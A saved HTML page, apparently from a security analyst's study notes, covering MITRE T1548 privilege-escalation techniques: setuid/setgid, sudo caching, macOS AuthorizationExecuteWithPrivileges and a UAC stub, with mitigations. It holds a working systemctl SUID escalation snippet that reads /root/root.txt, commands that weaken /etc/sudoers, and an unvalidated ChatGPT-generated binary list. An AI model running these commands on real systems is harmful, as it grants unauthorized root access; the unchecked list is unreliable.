@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Elevation Control Abuse - Analyst</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="icon" href="https://bakerst221b.com/favicon.png">
+  <link href="/css/style-classic.css"></link>
+  
+  
+  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
+  
+
+  
+
+</head>
+
+<body class='page page-default-single'>
+  <div id="main-menu-mobile" class="main-menu-mobile">
+  <ul>
+    
+    
+    <li class="menu-item-home 🏡">
+      <a href="/">
+        <span>Home 🏡</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog ✍️">
+      <a href="/docs/blog">
+        <span>Blog ✍️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-ttp 🔍">
+      <a href="/docs/ttp">
+        <span>TTP 🔍</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-artefacts db 🏺">
+      <a href="/docs/tools">
+        <span>Artefacts DB 🏺</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-attacks db ⚔️">
+      <a href="/docs/tools">
+        <span>Attacks DB ⚔️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-tools db 🛠️">
+      <a href="/docs/tools">
+        <span>Tools DB 🛠️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-crypto 🗝️">
+      <a href="/docs/cryptography">
+        <span>Crypto 🗝️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me 🧝🏽‍♀️">
+      <a href="/docs/about">
+        <span>About me 🧝🏽‍♀️</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+  <div class="wrapper">
+    <div class='header'>
+  <div class="container">
+    <div class="logo">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
+    </div>
+    <div class="logo-mobile">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
+    </div>
+    
+
+    <div id="main-menu" class="main-menu">
+  <ul>
+    
+    
+    <li class="menu-item-home 🏡">
+      <a href="/">
+        <span>Home 🏡</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog ✍️">
+      <a href="/docs/blog">
+        <span>Blog ✍️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-ttp 🔍">
+      <a href="/docs/ttp">
+        <span>TTP 🔍</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-artefacts db 🏺">
+      <a href="/docs/tools">
+        <span>Artefacts DB 🏺</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-attacks db ⚔️">
+      <a href="/docs/tools">
+        <span>Attacks DB ⚔️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-tools db 🛠️">
+      <a href="/docs/tools">
+        <span>Tools DB 🛠️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-crypto 🗝️">
+      <a href="/docs/cryptography">
+        <span>Crypto 🗝️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me 🧝🏽‍♀️">
+      <a href="/docs/about">
+        <span>About me 🧝🏽‍♀️</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+    
+    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
+  <span class="hamburger-box">
+    <span class="hamburger-inner"></span>
+  </span>
+</button>
+    
+    <div style="margin-left: 20pt;">
+      <a href="/index.xml" type="application/rss+xml">
+        <img src="/images/rss.png" alt="RSS Feed">
+      </a>
+    </div>
+    
+    <style>
+      a[href="/index.xml"] {
+        display: inline-block;
+        vertical-align: middle;
+        margin-right: 10px;
+      }
+    
+      a[href="/index.xml"] img {
+        height: 30px;
+      }
+    </style>
+    
+  </div>
+</div>
+
+
+    
+    
+    
+    
+    
+    
+
+    
+    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
+      <div class="row">
+        <div class="col-12 col-md-3 mb-3">
+          <div class="sidebar">
+            
+<div class="docs-menu">
+  <p>
+   <a href="/docs/attacks/persesc/"> 👈🏼 Back to </br> Persistence and Escalation Mechanisms </a>
+  </p>
+  <aside>
+   <nav id="TableOfContents">
+  <ul>
+    <li><a href="#linux--macos">Linux &amp; macOS</a>
+      <ul>
+        <li><a href="#setuid-and-setgid"><code>setuid</code> and <code>setgid</code></a></li>
+        <li><a href="#sudo-caching">Sudo caching</a></li>
+        <li><a href="#authorizationexecutewithprivileges"><code>AuthorizationExecuteWithPrivileges</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#windows">Windows</a>
+      <ul>
+        <li><a href="#uac-abuse">UAC Abuse</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+ </aside>
+</div>
+
+
+
+          </div>
+        </div>
+        <div class="col-12 col-md-9">
+          
+<h1 class="title">Elevation Control Abuse</h1>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    <div class="meta">
+      
+      
+
+      
+      
+
+      
+    </div>
+    
+    <b>Created:</b> 03.06.2023
+    <br />
+
+    
+
+  </header>
+
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="linux--macos">Linux &amp; macOS</h2>
+<h3 id="setuid-and-setgid"><code>setuid</code> and <code>setgid</code></h3>
+<p><strong>Platforms</strong>: macOS, Linux
+<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/001/">https://attack.mitre.org/techniques/T1548/001/</a></p>
+<p><code>setuid</code> or <code>setgid</code> bits set in UNIX. <code>chmod u+s [file]</code> or <code>chmod 4777 [file]</code> to set the bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used. Look for the files with the bit set: <code>find / -perm +4000 2&gt;/dev/null</code> and <code>find / -perm +2000 2&gt;/dev/null</code> for the <code>segid</code>.</p>
+<p>When a user runs an executable file with the setuid bit set, the real user ID (RUID) of the process is set to the user ID of the user who ran the file, while the effective user ID (EUID) is set to the user ID of the file owner. This means that the process runs with the privileges of the file owner while still retaining the identity of the user who executed the file.</p>
+<p>One of the files with this bit set is <strong>systemctl</strong>. This process is used to start services, for example, an apache server: <code>sudo systemctl start apache2</code>. However, if this file is assigned SUID permissions by mistake, it can be used for privilege escalation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">eop</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service <span class="c1"># create a temp file with a random unique name and store the name in a eop variable</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; [Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$eop</span> <span class="c1"># write the config for the service into the file. This unit file will be used by the systemctl to run the process specified in the ExecStart variable. </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ Do not copy this code in whole, line by line without the &gt; sign, or else you will not get it work</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ I have added touch $eop but it&#39;s not required (it was in my case, cause I had an error)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$eop</span> <span class="c1"># This command in Linux creates a symbolic link for the service file specified in the &#34;$eop&#34; environment variable, in the &#34;/etc/systemd/system/&#34; directory, using the systemctl utility. The link created allows the service to be managed with systemctl commands.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$eop</span> <span class="c1"># This command in Linux enables and starts the service specified in the &#34;$eop&#34; environment variable, using the systemctl utility. The &#34;enable&#34; option makes the service to start at boot time, while the &#34;--now&#34; option starts the service immediately after the command is executed.</span>
+</span></span></code></pre></div><p>Below is the list generated by ChatGTP (to validate) that shows other executables with this bit set that are potentially useful to the attacker:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/passwd: Used to change user passwords. A vulnerability in this file could allow an attacker to gain root privileges.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/chsh: Used to change a user<span class="s1">&#39;s default shell. A vulnerability in this file could allow an attacker to gain root privileges.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">/usr/bin/chfn: Used to change a user&#39;</span>s finger information. A vulnerability in this file could allow an attacker to gain root privileges.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/sudo: Used to run commands as another user, typically root. A vulnerability in this file could allow an attacker to gain root privileges.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/sudoedit: Used to edit files as another user, typically root. A vulnerability in this file could allow an attacker to gain root privileges.
+</span></span></code></pre></div><p><strong>Mitigation</strong>: Don&rsquo;t set this bit on binaries with known shell escape vulnerabilities.</p>
+<h3 id="sudo-caching">Sudo caching</h3>
+<p><strong>Platforms</strong>: macOS, Linux
+<strong>MITRE:</strong> <a href="https://attack.mitre.org/techniques/T1548/003/">https://attack.mitre.org/techniques/T1548/003/</a></p>
+<p>One can add <code>admin ALL=(ALL) NOPASSWD: ALL</code> to the <code>/etc/sudoers</code> file.
+Also, malware might monitor <code>/var/db/sudo</code> file for the timestamp and execurte when possible.
+Also, it&rsquo;s possible to disable terminal windows isolation, like this: <code>echo \'Defaults !tty_tickets\' &gt;&gt; /etc/sudoers</code>.</p>
+<h3 id="authorizationexecutewithprivileges"><code>AuthorizationExecuteWithPrivileges</code></h3>
+<p><strong>Platforms</strong>: macOS
+<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/004/">https://attack.mitre.org/techniques/T1548/004/</a></p>
+<p><code>AuthorizationExecuteWithPrivileges</code> API (macOS). Set the preferences to block all programs not downloaded from AppStore. Basically, it brings a prompt and asks the user to grant the permissions. The trick is to be convincing enought so that the user grants the permissions.</p>
+<p><strong>Mitigations</strong>: least privilege, proper configuration, defense in-depth, zero trust.</p>
+<p><strong>Writeups</strong> 📚:</p>
+<ul>
+<li><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</a></li>
+<li><a href="https://n0w4n.nl/vulnversity/">https://n0w4n.nl/vulnversity/</a></li>
+</ul>
+<h2 id="windows">Windows</h2>
+<h3 id="uac-abuse">UAC Abuse</h3>
+<p><strong>Platforms</strong>: Windows
+<strong>MITRE</strong>: <a href="https://attack.mitre.org/techniques/T1548/002/">https://attack.mitre.org/techniques/T1548/002/</a></p>
+<p>Abusing UAC on Windows.</p>
+<h2 id="references">References</h2>
+<details>
+    <summary>Expand&hellip;</summary>
+    Something here
+</details>
+
+  </div>
+</article>
+</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+  </div>
+
+  <div class="sub-footer">
+  <div class="container">
+    <div class="row">
+      <div class="col-12">
+        <div class="sub-footer-inner">
+          <ul>
+            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
+            </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
+  
+
+  
+  
+  
+    
+  
+
+
+</body>
+
+</html>
